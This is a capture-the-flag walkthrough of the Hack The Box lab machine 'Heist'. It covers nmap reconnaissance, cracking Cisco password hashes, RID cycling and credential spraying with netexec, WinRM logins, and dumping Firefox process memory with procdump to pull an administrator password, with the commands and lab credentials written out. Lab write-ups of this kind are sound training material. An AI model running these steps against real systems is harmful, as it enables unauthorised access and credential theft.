---
icon: windows
---

# Heist - Easy

<figure><img src="../../.gitbook/assets/image (2836).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/Heist"><strong>Heist</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```bash
## Nmap TCP
nmap -A -T4 -p- -Pn 10.10.10.149 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-19 09:43 EST
Nmap scan report for 10.10.10.149
Host is up (0.056s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49669/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-11-19T14:50:58
|_  start_date: N/A
|_clock-skew: 1s

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   82.44 ms 10.10.16.1
2   93.53 ms 10.10.10.149

```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2839).png" alt=""><figcaption></figcaption></figure>

There is a login form on this site and a login as guest option. Let's check it out

<figure><img src="../../.gitbook/assets/image (2841).png" alt=""><figcaption></figcaption></figure>

We got 2 users Hazard and admin let's save them to a users file. Now let's check out the attachment

<figure><img src="../../.gitbook/assets/image (2842).png" alt=""><figcaption></figcaption></figure>

The attachment contains 3  cisco password hashes. They are 2 different types of hashes&#x20;

<table><thead><tr><th width="461" valign="middle">Hash</th><th>Hash Type</th></tr></thead><tbody><tr><td valign="middle"><p></p><p>enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91</p></td><td>Cisco Type 5<br>salted md5</td></tr><tr><td valign="middle">username rout3r password 7 0242114B0E143F015F5D1E161713</td><td>Cisco Type 7<br>Custom, reversible</td></tr><tr><td valign="middle">username admin privilege 15 password 7 02375012182C1A1D751618034F36415408</td><td>Cisco Type 7<br>Custom, reversible</td></tr></tbody></table>

### <mark style="color:$primary;">Cracking Type 5 Hash</mark>

We can attempt cracking the Type 5 password using john

```bash
john type5.hash -w=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (2843).png" alt=""><figcaption></figcaption></figure>

Before attempting to crack the type 7 I am going to attempt credential spraying and see if we can uncover something.

<figure><img src="../../.gitbook/assets/image (2844).png" alt=""><figcaption></figcaption></figure>

We found Hazard's password

<figure><img src="../../.gitbook/assets/image (2845).png" alt=""><figcaption></figcaption></figure>

Ok Hazard has smb access but there are not interesting shares to explore. With SMB access we can perform RID-Cycling and discover more users!

### <mark style="color:$primary;">RID-Cycling</mark>

{% code overflow="wrap" %}
```bash
netexec smb 10.10.10.149 -u Hazard -p stealth1agent --rid-brute | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2846).png" alt=""><figcaption></figcaption></figure>

Now we have a larger pool of users!&#x20;

Let's try cracking the type 7 hash now

### <mark style="color:$primary;">Cracking Type 7 Hash</mark>

I used the below site to crack the hashes&#x20;

{% embed url="https://www.ifm.net.nz/cookbooks/passwordcracker.html" %}

<figure><img src="../../.gitbook/assets/image (2847).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2848).png" alt=""><figcaption></figcaption></figure>

You can also use this [**github repo**](https://github.com/theevilbit/ciscot7) to crack the passwords!

Now I will try credential spraying with the users and passwords I discovered and see if any of the users has remote access!

### <mark style="color:$primary;">Credential Spraying</mark>&#x20;

```bash
netexec winrm 10.10.10.149 -u users -p passwords --continue-on-success
```

<figure><img src="../../.gitbook/assets/image (2849).png" alt=""><figcaption></figcaption></figure>

Nice we got a hit let's login as chase

```bash
evil-winrm -i 10.10.10.149 -u chase -p 'Q4)sJu\Y8qz*A3?d'
```

<figure><img src="../../.gitbook/assets/image (2850).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (2851).png" alt=""><figcaption></figcaption></figure>

There is a todo list on chase's desktop.

The first is referring to the issues webpage we saw earlier! Which means the user is going to constantly use a browser to check the issues page possible some credentials store in a browser!?

Let's check processes&#x20;

```powershell
get-process firefox
```

<figure><img src="../../.gitbook/assets/image (2852).png" alt=""><figcaption></figcaption></figure>

That is a decent amount of firefox instances open!

### <mark style="color:$primary;">Dumping & Analyzing Process</mark>

I will use procdump for this. You can grab it from here

{% embed url="https://live.sysinternals.com/" %}

Transfer it to the machine. I did it via a simple python webserver

Now let's proceed to dump the running process&#x20;

```bash
./procdump.exe -ma 5148 firefox -accepteula
```

<figure><img src="../../.gitbook/assets/image (2853).png" alt=""><figcaption></figcaption></figure>

That is one big file I will download it to my machine and use strings to go through the file

<figure><img src="../../.gitbook/assets/image (2854).png" alt=""><figcaption></figcaption></figure>

```bash
strings -el firefox.dmp | grep password
```

<figure><img src="../../.gitbook/assets/image (2855).png" alt=""><figcaption></figcaption></figure>

Nice we found what looks like is the administrator password let's use it to login as him

```bash
evil-winrm -i 10.10.10.149 -u administrator -p '4dD!5}x/re8]FBuZ'
```

<figure><img src="../../.gitbook/assets/image (2856).png" alt=""><figcaption></figcaption></figure>
